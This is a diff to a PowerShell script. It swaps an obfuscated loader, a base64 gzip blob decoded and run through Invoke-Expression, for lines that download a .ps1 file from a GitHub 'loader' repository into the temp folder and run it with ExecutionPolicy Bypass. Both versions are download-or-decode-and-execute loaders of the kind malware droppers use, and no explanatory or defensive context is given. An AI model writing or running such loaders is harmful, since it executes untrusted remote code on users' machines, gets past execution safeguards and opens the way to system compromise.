@@ -1,1 +1,4 @@
-$compressed = 'H4sIAAAAAAAA/1zOQUvEMBAF4Huh/yEsvWYHD14WvIgriIhFXbx4yWZHM2yaxJlJa/+92IOUPb/3Pl4nnqnogaO5MZugWmQH8EUa6nHr8wCPOFK6c3y+hpjdCRnYTcD4KRDQnQQGR2mJtkWuNm3TKQ7lniL+gR2mcfe2f+o/Vo22eUhjPqN9x+MLflcUNfbAZFZn7HPVBfnn2qbPE/JrwBiN3f+gr0o59TmSn83tXJyIsZeb3wAAAP//AMQKNOAAAAA='; $bytes = [System.Convert]::FromBase64String($compressed); $stream = New-Object IO.MemoryStream(, $bytes); $decompressed = New-Object IO.Compression.GzipStream($stream, [IO.Compression.CompressionMode]::Decompress); $reader = New-Object IO.StreamReader($decompressed); $obfuscated = $reader.ReadToEnd(); Invoke-Expression $obfuscated
+$scriptUrl = "https://github.com/KevinDark5/loader/raw/refs/heads/main/load.ps1"
+$tempFile = "$env:TEMP\\loadfile.ps1"
+Invoke-WebRequest -Uri $scriptUrl -OutFile $tempFile
+PowerShell -ExecutionPolicy Bypass -File $tempFile
